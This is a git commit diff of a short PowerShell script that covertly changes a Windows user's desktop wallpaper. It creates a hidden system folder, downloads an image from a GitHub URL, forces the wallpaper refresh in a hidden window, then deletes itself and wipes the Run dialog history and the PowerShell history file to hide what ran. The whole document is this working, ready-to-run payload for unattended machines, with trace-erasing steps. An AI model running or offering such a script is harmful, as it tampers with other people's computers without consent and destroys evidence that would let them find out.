93a500fc37dfd85a4acb39845560f0e194bb8bf6
Noshbit <93923548+Noshbit@users.noreply.github.com>
2021-11-08 21:24:15 +0100

    Update 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -1,3 +1,3 @@
-md "$env:USERPROFILE\temp"; attrib +s +h "$env:USERPROFILE\temp"; iwr "https://raw.githubusercontent.com/Noshbit/miniature-octo-carnival/main/d.jpg" -outfile "$env:USERPROFILE\temp\a.jpg"; sp 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\a.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden; $i; $i++};
+attrib +s +h "$env:USERPROFILE\temp"; iwr "https://raw.githubusercontent.com/Noshbit/miniature-octo-carnival/main/d.jpg" -outfile "$env:USERPROFILE\temp\a.jpg"; sp 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\a.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden; $i; $i++};
 rm "$env:userprofile\temp\1.ps1";
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; $pshist = Get-PSReadlineOption | select -expand historysavepath; rm $pshist;
